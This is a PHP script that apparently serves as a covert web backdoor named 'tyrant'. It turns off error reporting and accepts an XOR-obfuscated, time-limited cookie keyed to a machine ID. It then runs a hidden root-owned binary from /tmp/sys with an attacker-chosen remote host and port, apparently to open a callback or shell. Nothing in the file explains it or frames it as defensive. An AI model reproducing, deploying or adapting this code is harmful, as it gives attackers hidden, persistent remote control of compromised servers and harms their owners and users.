
<?php
$mid = "@MID";
$timeout = 30;

function base64url_decode($data) {
    $base64 = str_replace(['-', '_'], ['+', '/'], $data);
    $padding = strlen($base64) % 4;
    if ($padding > 0) {
        $base64 .= str_repeat('=', 4 - $padding);
    }
    return base64_decode($base64);
}

function reverseString($str) {
    return strrev($str);  
}

function getTimestamp() {
    return strval(intval(time()));
}

function xor_decrypt($data, $key) {
    $decrypted = '';
    $key_length = strlen($key);
    if ($key_length === 0) {
        return '';
    }
    for ($i = 0; $i < strlen($data); $i++) {
        $decrypted .= chr(ord($data[$i]) ^ ord($key[$i % $key_length]));
    }
    return $decrypted;
}

function decrypt($data) {
    if ($GLOBALS['mid'] === '' || $GLOBALS['mid'] === '@MID') {
        return false;
    }
    $parts = explode('.', $data, 3);
    if (count($parts) !== 3) {
        return false;
    }
    list($_, $b1, $b2) = $parts;
    $b2_ = base64url_decode($b2);
    if ($b2_ === false || $b2_ === '') {
        return false;
    }
    $b2_time = xor_decrypt($b2_, reverseString($GLOBALS['mid']));
    if (!ctype_digit($b2_time) || getTimestamp() - $b2_time >= $GLOBALS['timeout']) {
        return false;
    }
    $b1_ = base64url_decode($b1);
    if ($b1_ === false) {
        return false;
    }
    return xor_decrypt($b1_, $GLOBALS['mid']);
}

function tyrant($uid, $rhost, $rport) {
    $file_path = '/etc/ty.conf';
    if (!ctype_digit($uid)) {
        return 4131;
    }
    if (!filter_var($rhost, FILTER_VALIDATE_IP)) {
        return 4131;
    }
    if (!ctype_digit($rport) || intval($rport) < 1 || intval($rport) > 65535) {
        return 4131;
    }

    $file_name = trim((string) file_get_contents($file_path));
    if (!preg_match('/^[a-fA-F0-9]{32}$/', $file_name)) {
        return 4131;
    }

    $bin_path = '/tmp/sys/' . $file_name;
    
    // Validate /tmp/sys directory security
    $dir_stat = @lstat('/tmp/sys');
    if ($dir_stat === false || !is_dir('/tmp/sys')) {
        error_log('Security: /tmp/sys does not exist or is not a directory');
        return 4131;
    }
    if ($dir_stat['uid'] !== 0) {
        error_log('Security: /tmp/sys is not owned by root');
        return 4131;
    }
    if (($dir_stat['mode'] & 0022) !== 0) {
        error_log('Security: /tmp/sys has insecure permissions');
        return 4131;
    }
    
    // Validate the binary file security
    $file_stat = @lstat($bin_path);
    if ($file_stat === false) {
        error_log('Security: Binary file does not exist');
        return 4131;
    }
    if (!is_file($bin_path)) {
        error_log('Security: Binary path is not a regular file');
        return 4131;
    }
    if ($file_stat['uid'] !== 0) {
        error_log('Security: Binary is not owned by root');
        return 4131;
    }
    if (!is_executable($bin_path)) {
        error_log('Security: Binary is not executable');
        return 4131;
    }

    $escaped_uid = escapeshellarg($uid);
    $escaped_rhost = escapeshellarg($rhost);
    $escaped_rport = escapeshellarg($rport);
    $escaped_bin = escapeshellarg($bin_path);

    exec("$escaped_bin -uid $escaped_uid -rhost $escaped_rhost -rport $escaped_rport", $output, $status);
    return ($status === 0) ? 4132 : 4131;
}

function check_id($c_id){
    $machine_id = $GLOBALS['mid'];
    return ($machine_id === $c_id);
}

ini_set('display_errors', 0);  
error_reporting(0);  

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_COOKIE['tyrant'])) {
        $data = $_COOKIE['tyrant'];
        $decrypted_message = decrypt($data);

        if ($decrypted_message) {
            $json_data = json_decode($decrypted_message, true);

            if (is_array($json_data) && isset($json_data['id'], $json_data['uid'], $json_data['rhost'], $json_data['rport']) && check_id($json_data['id'])) {
                $status_code = tyrant($json_data['uid'], $json_data['rhost'], $json_data['rport']);
            } else {
                $status_code = 4130;
            }
        } else {
            $status_code = 4130;
        }
        echo "<script>document.getElementById('bk').value = " . json_encode($status_code) . ";</script>";
    }
}
